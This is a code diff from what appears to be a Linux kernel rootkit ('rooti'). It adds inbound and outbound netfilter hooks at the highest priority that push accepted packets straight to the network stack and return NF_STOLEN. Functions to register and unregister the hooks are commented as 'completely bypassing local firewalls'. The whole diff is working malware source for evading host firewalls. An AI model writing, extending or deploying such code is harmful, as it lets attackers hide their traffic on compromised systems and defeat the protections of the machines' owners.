@@ -87,8 +87,7 @@ static unsigned int rooti_netfilter_hook(void *priv, struct sk_buff *skb, const 
         }
         if (rule->action == ROOTI_PACKET_DROP) return NF_DROP;
         if (rule->action == ROOTI_PACKET_ACCEPT) {
-            // Forcefully send the packet out to the wire
-            ROOTI_DEBUG("okfn addr: 0x%lx", (unsigned long)state->okfn);
+            // Forcefully send the packet out to the wire / to the user
             state->okfn(state->net, state->sk, skb);
             return NF_STOLEN;
         }
@@ -97,9 +96,41 @@ static unsigned int rooti_netfilter_hook(void *priv, struct sk_buff *skb, const 
     return NF_ACCEPT;
 }
 
-struct nf_hook_ops rooti_netfilter_hook_ops = {
+static struct nf_hook_ops rooti_inbound_nf_hook = {
+    .hook = rooti_netfilter_hook,
+    .hooknum = NF_INET_LOCAL_IN,
+    .pf = PF_INET,
+    .priority = NF_IP_PRI_FIRST
+};
+
+static struct nf_hook_ops rooti_outbound_nf_hook = {
     .hook = rooti_netfilter_hook,
     .hooknum = NF_INET_LOCAL_OUT,
     .pf = PF_INET,
     .priority = NF_IP_PRI_FIRST
 };
+
+// Registers netfilter hooks for completely bypassing local firewalls
+int rooti_install_fw_bypass_hooks()
+{
+    int err;
+
+    err = nf_register_net_hook(&init_net, &rooti_inbound_nf_hook);
+    if (err) {
+        ROOTI_DEBUG("nf_register_net_hook() failed: %d", err);
+        return err;
+    }
+    err = nf_register_net_hook(&init_net, &rooti_outbound_nf_hook);
+    if (err) {
+        ROOTI_DEBUG("nf_register_net_hook() failed: %d", err);
+        return err;
+    }
+    return 0;
+}
+
+// Unregisters netfilter hooks for firewall bypassing
+void rooti_uninstall_fw_bypass_hooks()
+{
+    nf_unregister_net_hook(&init_net, &rooti_inbound_nf_hook);
+    nf_unregister_net_hook(&init_net, &rooti_outbound_nf_hook);
+}
